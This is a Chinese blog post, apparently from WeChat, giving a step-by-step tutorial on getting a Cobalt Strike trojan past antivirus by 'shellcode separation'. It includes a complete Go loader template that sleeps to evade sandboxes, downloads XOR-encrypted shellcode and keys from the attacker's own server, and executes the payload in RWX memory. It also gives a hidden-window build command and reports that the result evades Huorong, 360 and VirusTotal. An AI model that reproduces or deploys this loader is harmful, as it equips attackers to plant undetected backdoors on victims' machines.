> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/KIiaTcf2SHAcYgfONTDw1A)

10 月 13 日  

**CS 木马 shellcode 分离免杀上线**

![](https://mmbiz.qpic.cn/mmbiz_png/toroKEibicmZBzvSicIgIV5Qc7btROE3LoSnTokjLGNZwUrKMNWWiankMu9UQVH05bgJ33COlZGWA3E3SKdND6stkw/640?wx_fmt=png)

最近在学习 CS 怎么去免杀，今天来分享一下吧，反正有手就行呗

![](https://mmbiz.qpic.cn/mmbiz_png/toroKEibicmZBzvSicIgIV5Qc7btROE3LoSnTokjLGNZwUrKMNWWiankMu9UQVH05bgJ33COlZGWA3E3SKdND6stkw/640?wx_fmt=png)

**0x00** **Article directory [****目录结构]**

0x01 环境介绍

0x02 插件部署

0x03 改造流程

0x04 测试效果

0x05 总结

![](https://mmbiz.qpic.cn/mmbiz_png/toroKEibicmZBzvSicIgIV5Qc7btROE3LoSnTokjLGNZwUrKMNWWiankMu9UQVH05bgJ33COlZGWA3E3SKdND6stkw/640?wx_fmt=png)  

**0x01** **环境介绍**

本次免杀所使用的是 shellcode 分离免杀技术

CS 版本：4.0 语言：Golang

插件：项目地址：

```
http://github.com/hack2fun/BypassAV
```

![](https://mmbiz.qpic.cn/mmbiz_png/toroKEibicmZBzvSicIgIV5Qc7btROE3LoSnTokjLGNZwUrKMNWWiankMu9UQVH05bgJ33COlZGWA3E3SKdND6stkw/640?wx_fmt=png)  

**0x02** **插件部署**

1、打开 cs 客户端，点击如图位置：

![](https://mmbiz.qpic.cn/mmbiz_png/toroKEibicmZCV8nlKlTDpib5oNpYWsuFvsFjhz3efZ6krcib0VQEaxJUCibmRJBc5moiahgvibJiawnqLek8CINSnsZSg/640?wx_fmt=png)

2、点击 load，加载插件：

![](https://mmbiz.qpic.cn/mmbiz_png/toroKEibicmZCV8nlKlTDpib5oNpYWsuFvsKdSzknjI59ZTfgvkcq7Bpp9S6OwatWSnhtOdoic939KFKnbWkw9sic2A/640?wx_fmt=png)

3、加载完毕后使用快捷键 ctrl + g 即可打开窗口进行生产 CS 木马

![](https://mmbiz.qpic.cn/mmbiz_png/toroKEibicmZCV8nlKlTDpib5oNpYWsuFvsOXMYCuH8arl2ibWmicYmyslEoZEwicPEeAVxlexF4zEaqj9lcnrf3dobg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/toroKEibicmZBzvSicIgIV5Qc7btROE3LoSnTokjLGNZwUrKMNWWiankMu9UQVH05bgJ33COlZGWA3E3SKdND6stkw/640?wx_fmt=png)

**0x03** **改造流程**

这个插件的功能是使用 golang 帮我们生成一个 CS 木马，在生成木马时会在对应目录留下 go 的源文件

![](https://mmbiz.qpic.cn/mmbiz_png/toroKEibicmZCV8nlKlTDpib5oNpYWsuFvsdSL26cVkUKlTr1HHDMSUEex8J3LVV1UCmLfa07UOBJTLlCVXPS7nsQ/640?wx_fmt=png)

我们在 CS 提前建立好监听器

![](https://mmbiz.qpic.cn/mmbiz_png/toroKEibicmZCV8nlKlTDpib5oNpYWsuFvsricryEYWrA22NNNjWp8u43KumefvQJKwYGkibibUHhFveI8kUX7SC0suQ/640?wx_fmt=png)

使用插件生成木马

![](https://mmbiz.qpic.cn/mmbiz_png/toroKEibicmZCV8nlKlTDpib5oNpYWsuFvsaiaUYeu4A7Tn6YbstKVThnbVsvf2YpVngz4xnJK98ic9q7VdNaKKaQBg/640?wx_fmt=png)

PS：记得把杀毒软件关闭了先，不然会直接杀掉

在 windows 环境下，会在 C://windows//temp 目录下生成的源文件

先来看下这个文件的核心代码吧

![](https://mmbiz.qpic.cn/mmbiz_png/toroKEibicmZCV8nlKlTDpib5oNpYWsuFvswlo4XtibIS7ww93XWnv2Wrpzc3BwIqhrn5iaTBHNfY6yIrh44N7yBFMw/640?wx_fmt=png)

xor_shellcode 为插件提前加密好的，用切片变量存储

![](https://mmbiz.qpic.cn/mmbiz_png/toroKEibicmZCV8nlKlTDpib5oNpYWsuFvsDOoReatUrAiawku0eibX03sDpLde4WtnwVApvrckog3wPFIUbCIlChNg/640?wx_fmt=png)

加密时用到两个密钥，KEY_1 和 KEY_2，使用的是异或加密。在 for 循环里对 shellcode 进行解密，然后申请内存进行加载，最后调用 syscall 指向地址执行。

**改造思路如下:**

1) 入口 main 函数处加一个 sleep，延时执行

2) 动态获取 shellcode 以及密钥，我们把密钥和 shellcode 放到我们的 VPS，起一个 http 服务器，通过 get 去请求

流程：

1）在 main 函数入口加入如下代码：

```
time.Sleep(5 * time.Second)
```

2）程序中 shellcode 为切片类型，在放到 http 服务器上时，还需要做一下转换，使用如下代码：

```
package main
import (
    "fmt"
    "encoding/hex"
)
func main() {
  aa :=[]byte{shellcode复制到这里}
  fmt.Println(hex.EncodeToString([]byte(aa)))
}
```

CMD 执行：go run get.go

PS：随便创建一个 go 文件即可

![](https://mmbiz.qpic.cn/mmbiz_png/toroKEibicmZCV8nlKlTDpib5oNpYWsuFvsHajOPCEsMya9NCDWZPhlCbcIhnwMmO68BRj3H2c0TwLaR0ldLEiaYiaQ/640?wx_fmt=png)

将生成的数据放到 http 服务器上，例如创建一个 1.txt

3）程序中的 KEY 也是切片数据，用上一步的代码进行转换，如下图所示：

![](https://mmbiz.qpic.cn/mmbiz_png/toroKEibicmZCV8nlKlTDpib5oNpYWsuFvsKrBg21CluYFGV6Sl1HbU5ibycLSuq9ZCFOyKicKVFu1AiaakW3VWTluRw/640?wx_fmt=png)

CMD 执行：go run get.go

![](https://mmbiz.qpic.cn/mmbiz_png/toroKEibicmZCV8nlKlTDpib5oNpYWsuFvsOETV3lbAj5Y1WjkiaMuiaX1khZDMN70kP1q7rzC3vpHS7GxM5GTHpAeg/640?wx_fmt=png)

HTTP 服务器上创建两个 txt，例如 2.txt 放入密钥 1，3.txt 放入密钥 2

创建好后记得把源代码前面的密钥变量进行删除

![](https://mmbiz.qpic.cn/mmbiz_png/toroKEibicmZCV8nlKlTDpib5oNpYWsuFvs2YAnF54850A30L2f2XDasPwddVW3JpmibnYggyIJDoyhmlic9AAfBcMw/640?wx_fmt=png)

4）获取 http 服务器上的数据

![](https://mmbiz.qpic.cn/mmbiz_png/toroKEibicmZCV8nlKlTDpib5oNpYWsuFvsDqcMxAibecfqic5W3O1icVmaPKQGjboaaP7Ifia1nvuBX34Z6sIyrEUicTQ/640?wx_fmt=png)

紧接着加入两行代码，获取对应的 key

![](https://mmbiz.qpic.cn/mmbiz_png/toroKEibicmZCV8nlKlTDpib5oNpYWsuFvsKicCVZ3jf6v2NY4eeBpIHZ1olWice9MJVKP4oox43ls7cREADJnubScw/640?wx_fmt=png)

keys1、keys2 函数为获取密钥，并且返回值，大致代码如下：

![](https://mmbiz.qpic.cn/mmbiz_png/toroKEibicmZCV8nlKlTDpib5oNpYWsuFvstp13QmAWPTSFEaEZ21eepQbibQibkUsGzmvflm83KI1QnHDr7QicibwVTQ/640?wx_fmt=png)

**温馨提示，如果你写的参数名字和我一样，记得把模板文件中的 xor_shellcode 换成 x1，shellcode 换成 res。**

最后一步，在开头加入需要使用到的包：

```
import (
  "syscall"
  "unsafe"
  "time"
    "encoding/hex"
    "io/ioutil"
    "net/http"
)
```

5）编译成 exe 文件

CMD 执行命令：go build -o svc.exe -ldflags -H=windowsgui temp.go

PS：svc.exe 为生成文件，temp.go 为我们改造的源代码文件

![](https://mmbiz.qpic.cn/mmbiz_png/toroKEibicmZBzvSicIgIV5Qc7btROE3LoSnTokjLGNZwUrKMNWWiankMu9UQVH05bgJ33COlZGWA3E3SKdND6stkw/640?wx_fmt=png)

**0x04** **测试效果**

某绒

![](https://mmbiz.qpic.cn/mmbiz_png/toroKEibicmZCV8nlKlTDpib5oNpYWsuFvsz2ze7JBsWkvjbdPfSWMquyK3teN6orBdVlTb8NTnH3m1JRURo9abeQ/640?wx_fmt=png)

某 60

![](https://mmbiz.qpic.cn/mmbiz_png/toroKEibicmZCV8nlKlTDpib5oNpYWsuFvsvTqj49iaLJ13tOHzviaOPNulnKGwkFAvWH033TFP0neABicPuqeLyTWyw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/toroKEibicmZCV8nlKlTDpib5oNpYWsuFvsXa7NPz5W7MV54zBPoTeJU0OhiaTtYGIt5Pe5aGWrfemdJFgTwPtuBew/640?wx_fmt=png)

VT

![](https://mmbiz.qpic.cn/mmbiz_png/toroKEibicmZCV8nlKlTDpib5oNpYWsuFvsuR71HmibMic3kr7aMiaNQpicbzWeFu4SPNLgMbqJe7UvAWLQTkznzbC9NQ/640?wx_fmt=png)

沙箱我就不截图了，由于我的 VPS 被标黑了，所以情报过不去，但是从沙箱的角度来看是没有检测出来的，大家可以自行测试。

最后成功上线：

![](https://mmbiz.qpic.cn/mmbiz_png/toroKEibicmZCV8nlKlTDpib5oNpYWsuFvsALxhFwWJ6RkedurQOUtUnnwzMiaWciaRAAZHTdjuLt8EsupHZEgUAZUw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/toroKEibicmZBzvSicIgIV5Qc7btROE3LoSnTokjLGNZwUrKMNWWiankMu9UQVH05bgJ33COlZGWA3E3SKdND6stkw/640?wx_fmt=png)

**0x05 summary 总结**

作为一个免杀萌新，记录一下学习，免杀的手段还有很多，比如流量对抗、防逆向代码对抗、威胁情报等等路还很长，顺便提个醒，在真实环境中，这种回连木马除了要过终端的防御之外，还得过流量检测设备，目前厂商的设备基本具备检测 3.14、4.0 版本（其他没有测试过）的 CS 流量，但是如果修改 CS 的特征的话，还是可以规避检测的。

贴一下模板源代码吧，大家可以自行修改参数进行使用：

```
package main
import (
  "syscall"
  "unsafe"
  "time"
    "encoding/hex"
    "io/ioutil"
    "net/http"
)
const (
  MEM_COMMIT             = 0x1000
  MEM_RESERVE            = 0x2000
  PAGE_EXECUTE_READWRITE = 0x40
)
var (
  kernel32      = syscall.MustLoadDLL("kernel32.dll")
  ntdll         = syscall.MustLoadDLL("ntdll.dll")
  VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
  RtlCopyMemory = ntdll.MustFindProc("RtlMoveMemory")
)
func keys1() byte {
  time.Sleep(5 * time.Second)
  resp, _ := http.Get("http://IP/https/2.txt")
    defer resp.Body.Close()
    body, _ := ioutil.ReadAll(resp.Body)
    var tmp = string(body)
    x1, _ := hex.DecodeString(tmp)
    return x1[0]
}
func keys2() byte {
  time.Sleep(5 * time.Second)
  resp, _ := http.Get("http://IP/https/3.txt")
    defer resp.Body.Close()
    body, _ := ioutil.ReadAll(resp.Body)
    var tmp = string(body)
    x1, _ := hex.DecodeString(tmp)
    return x1[0]
}
func main() {
  time.Sleep(5 * time.Second)
  resp, err := http.Get("http://IP/https/1.txt")
    if err != nil {
        return
    }
    defer resp.Body.Close()
    body, err := ioutil.ReadAll(resp.Body)
    var tmp = string(body)
    x1, _ := hex.DecodeString(tmp)
  var KEY_1 byte = keys1()
  var KEY_2 byte = keys2()
  var res []byte
  for i := 0; i < len(x1); i++ {
    res = append(res, x1[i]^KEY_1^KEY_2)
  }
  addr, _, err := VirtualAlloc.Call(0, uintptr(len(res)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
  if err != nil && err.Error() != "The operation completed successfully." {
    syscall.Exit(0)
  }
  _, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&res[0])), uintptr(len(res)))
  if err != nil && err.Error() != "The operation completed successfully." {
    syscall.Exit(0)
  }
  time.Sleep(5 * time.Second)
  syscall.Syscall(addr, 0, 0, 0, 0)
}
```

![](https://mmbiz.qpic.cn/mmbiz_png/toroKEibicmZBzvSicIgIV5Qc7btROE3LoSnTokjLGNZwUrKMNWWiankMu9UQVH05bgJ33COlZGWA3E3SKdND6stkw/640?wx_fmt=png)

**【往期推荐】**  

[未授权访问漏洞汇总](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247484804&idx=2&sn=519ae0a642c285df646907eedf7b2b3a&chksm=ea37fadedd4073c87f3bfa844d08479b2d9657c3102e169fb8f13eecba1626db9de67dd36d27&scene=21#wechat_redirect)

[【内网渗透】内网信息收集命令汇总](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485796&idx=1&sn=8e78cb0c7779307b1ae4bd1aac47c1f1&chksm=ea37f63edd407f2838e730cd958be213f995b7020ce1c5f96109216d52fa4c86780f3f34c194&scene=21#wechat_redirect)  

[【内网渗透】域内信息收集命令汇总](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485855&idx=1&sn=3730e1a1e851b299537db7f49050d483&chksm=ea37f6c5dd407fd353d848cbc5da09beee11bc41fb3482cc01d22cbc0bec7032a5e493a6bed7&scene=21#wechat_redirect)  

[记一次 HW 实战笔记 | 艰难的提权爬坑](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247484991&idx=2&sn=5368b636aed77ce455a1e095c63651e4&chksm=ea37f965dd407073edbf27256c022645fe2c0bf8b57b38a6000e5aeb75733e10815a4028eb03&scene=21#wechat_redirect)

[【超详细】Microsoft Exchange 远程代码执行漏洞复现【CVE-2020-17144】](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485992&idx=1&sn=18741504243d11833aae7791f1acda25&chksm=ea37f572dd407c64894777bdf77e07bdfbb3ada0639ff3a19e9717e70f96b300ab437a8ed254&scene=21#wechat_redirect)

[【超详细】Fastjson1.2.24 反序列化漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247484991&idx=1&sn=1178e571dcb60adb67f00e3837da69a3&chksm=ea37f965dd4070732b9bbfa2fe51a5fe9030e116983a84cd10657aec7a310b01090512439079&scene=21#wechat_redirect)

[【超详细】CVE-2020-14882 | Weblogic 未授权命令执行漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485550&idx=1&sn=921b100fd0a7cc183e92a5d3dd07185e&chksm=ea37f734dd407e22cfee57538d53a2d3f2ebb00014c8027d0b7b80591bcf30bc5647bfaf42f8&scene=21#wechat_redirect)  

[【奇淫巧技】如何成为一个合格的 “FOFA” 工程师](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485135&idx=1&sn=f872054b31429e244a6e56385698404a&chksm=ea37f995dd40708367700fc53cca4ce8cb490bc1fe23dd1f167d86c0d2014a0c03005af99b89&scene=21#wechat_redirect)
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

_**走过路过的大佬们留个关注再走呗**_![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTEATexewVNVf8bbPg7wC3a3KR1oG1rokLzsfV9vUiaQK2nGDIbALKibe5yauhc4oxnzPXRp9cFsAg4Q/640?wx_fmt=png)

**往期文章有彩蛋哦****![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTHtVfEjbedItbDdJTEQ3F7vY8yuszc8WLjN9RmkgOG0Jp7QAfTxBMWU8Xe4Rlu2M7WjY0xea012OQ/640?wx_fmt=png)**

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTECbvcv6VpkwD7BV8iaiaWcXbahhsa7k8bo1PKkLXXGlsyC6CbAmE3hhSBW5dG65xYuMmR7PQWoLSFA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/toroKEibicmZBzvSicIgIV5Qc7btROE3LoSnTokjLGNZwUrKMNWWiankMu9UQVH05bgJ33COlZGWA3E3SKdND6stkw/640?wx_fmt=png)